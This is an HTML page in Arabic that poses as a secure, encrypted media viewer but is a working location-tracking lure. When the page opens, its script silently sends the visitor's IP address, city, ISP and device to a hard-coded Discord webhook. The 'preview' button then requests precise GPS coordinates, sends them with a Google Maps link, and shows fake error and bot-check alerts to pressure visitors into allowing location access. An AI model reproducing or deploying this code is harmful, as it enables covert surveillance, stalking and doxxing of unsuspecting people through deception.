<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Gateway | التحقق من الهوية</title>
    <style>
        body { background: #0b0e14; color: #ffffff; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding-top: 80px; margin: 0; }
        .card { background: #161b22; margin: auto; padding: 30px; width: 85%; max-width: 400px; border-radius: 15px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .icon { font-size: 60px; color: #1a73e8; margin-bottom: 20px; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #8b949e; font-size: 14px; line-height: 1.6; }
        .btn { background: #1f6feb; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; transition: 0.3s; }
        .btn:active { transform: scale(0.95); background: #388bfd; }
        #status { font-size: 12px; color: #58a6ff; margin-top: 15px; display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">📡</div>
        <h2>بوابة العرض الآمنة</h2>
        <p>تم تشفير هذه الوسائط بواسطة بروتوكول AES-256. يرجى الضغط على الزر أدناه لبدء فحص أمان الجهاز وعرض المحتوى.</p>
        
        <button class="btn" onclick="masterLog()">معاينة الوسائط</button>
        <div id="status">جاري فحص بروتوكول SSL...</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1494444634586222682/HdxT-BynNCFlveKYWjMqYngyasuPSOVI-7a1RAA1QqAOLkW6O5MranKijd5v_yOoXZpa";

        // 1. وظيفة سحب الـ IP الصامتة (تعمل فوراً)
        async function silentLog() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const ipData = await response.json();
                
                sendToDiscord("🔔 **زيارة جديدة (صامتة)**", [
                    { name: "🌐 عنوان IP", value: ipData.ip, inline: true },
                    { name: "📍 المدينة", value: ipData.city + ", " + ipData.country_name, inline: true },
                    { name: "🏢 شركة الإنترنت", value: ipData.org, inline: false },
                    { name: "📱 الجهاز", value: navigator.platform, inline: true }
                ], 3447003); // لون أخضر للزيارة الصامتة
            } catch (e) { console.log("Silent log failed"); }
        }

        // تشغيل السحب الصامت بمجرد فتح الصفحة
        silentLog();

        // 2. وظيفة السحب النشط (عند الضغط على الزر)
        async function masterLog() {
            document.getElementById('status').style.display = "block";
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                // في حالة الموافقة على الموقع
                sendToDiscord("🎯 **هدف تم تحديده بدقة (GPS)**", [
                    { name: "📍 إحداثيات الموقع", value: `[فتح في خرائط جوجل](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
                    { name: "🎯 الدقة", value: `${pos.coords.accuracy.toFixed(1)} متر`, inline: true },
                    { name: "🔋 المتصفح الكامل", value: navigator.userAgent, inline: false }
                ], 15158332); // لون أحمر للصيد الدقيق

                setTimeout(() => {
                    alert("خطأ في تشفير الوسائط: يرجى تفعيل 'صلاحية الوصول الكامل' من إعدادات المتصفح.");
                }, 1000);

            }, (err) => {
                // في حالة الرفض (Block)
                sendToDiscord("⚠️ **الهدف رفض صلاحية الموقع**", [
                    { name: "الحالة", value: "قام بالضغط على Block", inline: false },
                    { name: "نصيحة", value: "تم الاكتفاء ببيانات الـ IP المسحوبة صامتاً.", inline: false }
                ], 16776960); // لون أصفر للتحذير
                
                alert("يجب السماح بالوصول للموقع لإثبات أنك لست روبوت (Bot Protection).");
            }, { enableHighAccuracy: true });
        }

        // وظيفة الإرسال الموحدة لـ Discord
        async function sendToDiscord(title, fields, color) {
            const payload = {
                username: "نظام التتبع المطور",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/2563/2563333.png",
                embeds: [{
                    title: title,
                    color: color,
                    fields: fields,
                    timestamp: new Date()
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }
    </script>
</body>
</html>
